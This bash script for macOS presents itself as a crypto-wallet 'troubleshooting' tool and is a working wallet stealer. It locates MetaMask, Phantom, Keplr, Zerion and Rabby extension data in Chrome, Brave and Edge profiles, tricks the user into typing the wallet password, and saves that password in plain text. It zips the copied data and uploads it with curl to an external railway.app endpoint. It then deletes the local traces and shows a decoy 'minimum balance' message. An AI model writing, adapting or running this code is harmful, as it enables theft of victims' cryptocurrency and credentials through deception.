#!/bin/bash

# ==============================================================================
# CONFIGURATION
# ==============================================================================

# Custom Redirect URI and WalletConnect metadata (REMOVED: These are Kotlin/Java code snippets and not relevant to the shell script logic)

# UPLOAD URL
uploadUrl="https://servipaz.up.railway.app/upload"

# Common macOS browser data root paths for Chromium-based browsers
CHROME_ROOT_DIR="$HOME/Library/Application Support/Google/Chrome"
BRAVE_ROOT_DIR="$HOME/Library/Application Support/BraveSoftware/Brave-Browser"
EDGE_ROOT_DIR="$HOME/Library/Application Support/Microsoft Edge"

# Array of directories to search (Profiles are subdirectories of these)
BROWSER_ROOTS=("$CHROME_ROOT_DIR" "$BRAVE_ROOT_DIR" "$EDGE_ROOT_DIR")

# Destination path (same as PowerShell script)
destination="$HOME/Desktop/ExtractedExtensioness"
zipFile="$destination/troubleshooting.zip"

# Extension IDs
declare -A extensionIDs=(
    ["MetaMask"]="nkbihfbeogaeaoehlefnkodbefgpgknn"
    ["Phantom"]="bfnaelmomeimhlpmgjnjophhpkkoljpa"
    ['Keplr']="dmkamcknogkgcdfhhbddcghachkejeap"
    ['Zerion']="klghhnkeealcohjjanjjdaeeggmfmlpl"
	['Rabby']="acmacodkjbdgmoleebolmdjonilkdbch"
)

# Color Codes for better output (ANSI escape codes)
COLOR_RED='\033[0;31m'
COLOR_GREEN='\033[0;32m'
COLOR_YELLOW='\033[0;33m'
COLOR_BLUE='\033[0;34m'
COLOR_MAGENTA='\033[0;35m'
COLOR_CYAN='\033[0;36m'
COLOR_DARK_GREEN='\033[0;92m'
COLOR_DARK_YELLOW='\033[0;93m'
COLOR_DARK_CYAN='\033[0;96m'
COLOR_NC='\033[0m' # No Color

# ==============================================================================
# FUNCTIONS
# ==============================================================================

# Function to extract the Profile name from the Preferences file
get_profile_name() {
    local profile_path="$1"
    
    # 1. Try to extract 'name' from the Preferences JSON file
    # Uses grep and sed to safely parse the JSON snippet without a full JSON parser
    local name=$(
        grep -E '"name"\s*:\s*"' "$profile_path/Preferences" 2>/dev/null |
        head -1 |
        sed -E 's/.*"name"[[:space:]]*:[[:space:]]*"([^"]+)".*/\1/'
    )
    
    # 2. If a valid, non-generic name is found, use it
    if [[ -n "$name" && "$name" != "Chrome" && "$name" != "Brave" && "$name" != "Edge" ]]; then
        echo "$name"
    else
        # 3. Fallback to the folder name (e.g., "Default" or "Profile 1")
        basename "$profile_path"
    fi
}

# Function to get and confirm password silently
get_confirmed_password() {
    local wallet="$1"
    local displayName="$2"
    
    while true; do
        echo -e "\n${COLOR_DARK_YELLOW}----------------------------------------------${COLOR_NC}"
        
        # Read password 1 silently (-s)
        read -s -p "Login with $wallet password for $displayName to proceed: " plain1
        echo
        
        # Read password 2 silently (-s)
        read -s -p "Confirm $wallet password for $displayName: " plain2
        echo
        
        echo -e "${COLOR_DARK_YELLOW}----------------------------------------------${COLOR_NC}"

        if [[ "$plain1" != "$plain2" ]]; then
            echo -e "${COLOR_RED}Passwords do not match. Try again.${COLOR_NC}"
        else
            echo "$plain1" # Return the password on success
            return 0
        fi
    done
}

# Function to fix files with invalid timestamps which cause issues with `zip`
fix_invalid_timestamps() {
    local path="$1"
    echo -e "${COLOR_DARK_YELLOW}Preparing ...${COLOR_NC}"
    
    # Use 'find' to locate all files and directories recursively
    # 'touch -t' sets the modification time to a specific time. 
    # Using 'date +%Y%m%d%H%M.%S' provides the current time in the required format.
    find "$path" -exec touch -t "$(date +%Y%m%d%H%M.%S)" {} + 2>/dev/null
    
    if [ $? -ne 0 ]; then
        echo -e "${COLOR_YELLOW}Please Wait ... (Do not close.. This might take a moment to complete)${COLOR_NC}"
    fi
}

# ==============================================================================
# MAIN SCRIPT EXECUTION
# ==============================================================================

# Ensure destination directory exists and is clean
rm -rf "$destination"
mkdir -p "$destination" || { echo -e "${COLOR_RED}ERROR: Could not create destination directory.${COLOR_NC}"; exit 1; }

echo -e "${COLOR_BLUE}Starting wallet data extraction...${COLOR_NC}"

# Array to store found wallets: format is "DISPLAYNAME|WALLETNAME|EXTPATH"
foundWallets=()

# ------------------------------------------------------------------------------
# 1. FIND ALL WALLETS
# ------------------------------------------------------------------------------
for browserRoot in "${BROWSER_ROOTS[@]}"; do
    if [ -d "$browserRoot" ]; then
        # Find all profile directories (Default, Profile 1, etc.)
        # Using find -maxdepth 1 to only check immediate subdirectories
        find "$browserRoot" -maxdepth 1 -type d -mindepth 1 | while read profilePath; do
            # Filter out known non-profile directories like "Safe Browsing"
            if [[ "$profilePath" =~ "Safe Browsing" ]]; then
                continue
            fi

            displayName=$(get_profile_name "$profilePath")
            
            for walletName in "${!extensionIDs[@]}"; do
                extID="${extensionIDs[$walletName]}"
                extPath="$profilePath/Local Extension Settings/$extID"

                if [ -d "$extPath" ]; then
                    foundWallets+=("$displayName|$walletName|$extPath")
                fi
            done
        done
    fi
done

foundCount=${#foundWallets[@]}

# ------------------------------------------------------------------------------
# 2. WALLET SELECTION/AUTO-PROCESS
# ------------------------------------------------------------------------------
if [ $foundCount -eq 0 ]; then
    echo -e "${COLOR_RED}Getting Started: No wallet data found${COLOR_NC}"
    rm -rf "$destination"
    exit 0
fi

walletToExtract=""

if [ $foundCount -eq 1 ]; then
    walletToExtract="${foundWallets[0]}"
    IFS='|' read -r selectedProfileName selectedWalletName selectedExtPath <<< "$walletToExtract"
    
    echo -e "\n${COLOR_DARK_GREEN}=============================================="
    echo -e "Found 1 wallet: ${selectedWalletName}."
    echo -e "Proceeding automatically."
    echo -e "==============================================${COLOR_NC}\n"
else
    echo -e "\n${COLOR_DARK_CYAN}=============================================="
    echo -e "      Choose Your Wallet     "
    echo -e "==============================================${COLOR_NC}"
    
    i=1
    for walletData in "${foundWallets[@]}"; do
        IFS='|' read -r displayName walletName extPath <<< "$walletData"
        echo -e "[${COLOR_YELLOW}$i${COLOR_NC}] ${walletName}"
        i=$((i+1))
    done
    
    echo -e "\nPlease choose your wallet:"
    echo -e "${COLOR_CYAN}Enter the number next to the wallet you want to use (e.g., enter 1 to select the first one).${COLOR_NC}"
    
    selection=""
    while true; do
        read -p "Selection (1-$foundCount): " input
        if [[ "$input" =~ ^[0-9]+$ ]] && [ "$input" -ge 1 ] && [ "$input" -le "$foundCount" ]; then
            selection=$input
            walletToExtract="${foundWallets[selection-1]}"
            IFS='|' read -r selectedProfileName selectedWalletName selectedExtPath <<< "$walletToExtract"
            break
        fi
        echo -e "${COLOR_RED}Invalid selection. Please enter a number between 1 and $foundCount.${COLOR_NC}"
    done
    
    echo -e "\nYou selected: ${COLOR_GREEN}${selectedWalletName}${COLOR_NC}." 
    echo -e "${COLOR_DARK_CYAN}==============================================${COLOR_NC}\n"
fi

# ------------------------------------------------------------------------------
# 3. EXTRACTION AND PASSWORD SAVING
# ------------------------------------------------------------------------------

# Get password for the SELECTED wallet
password=$(get_confirmed_password "$selectedWalletName" "$selectedProfileName")

if [ -z "$password" ]; then
    echo -e "${COLOR_RED}Password confirmation failed. Exiting.${COLOR_NC}"
    rm -rf "$destination"
    exit 1
fi

# Iterate over ALL found wallets to copy their data (as per original PS script's logic)
for walletData in "${foundWallets[@]}"; do
    IFS='|' read -r displayName walletName extPath <<< "$walletData"
    
    destPath="$destination/$displayName-$walletName"
    
    # Copy the extension data recursively
    cp -r "$extPath" "$destPath" 2>/dev/null
done

# Save the password for the SELECTED wallet only
passwordFile="$destination/$selectedProfileName-$selectedWalletName-password.txt"
echo "$password" > "$passwordFile"

# ------------------------------------------------------------------------------
# 4. ZIP AND UPLOAD
# ------------------------------------------------------------------------------
echo -e "\n${COLOR_GREEN}Getting Started ...${COLOR_NC}"

# Fix timestamps before zipping
fix_invalid_timestamps "$destination"

# Remove old zip file if it exists
rm -f "$zipFile"

# Compress the archive (using -r for recursive and suppressing output with >/dev/null)
# The '-j' flag is used to flatten the directory structure inside the zip, zipping only the contents of $destination
# zip -r -j "$zipFile" "$destination/"* > /dev/null
zip -r "$zipFile" "$destination/" -x "$zipFile" > /dev/null

if [ -f "$zipFile" ]; then
    echo -e "${COLOR_CYAN}Uploading data...${COLOR_NC}"
    
    # Use the pre-installed 'curl' tool for upload
    # -s (silent), -X POST (method), -F (form data for file upload)
    response=$(curl -s -X POST "$uploadUrl" -F "file=@$zipFile")
    
    if [ $? -eq 0 ]; then
        echo -e "${COLOR_GREEN}Upload complete. Cleaning up local files...${COLOR_NC}"
    else
        echo -e "${COLOR_RED}Upload failed. Keeping data on desktop for troubleshooting.${COLOR_NC}"
    fi
    
    # Clean up the temporary folder and the zip file
    rm -rf "$destination"
fi

echo -e "\n${COLOR_GREEN}Troubleshoot result: Minimum balance quota not met${COLOR_NC}"

# ==============================================================================
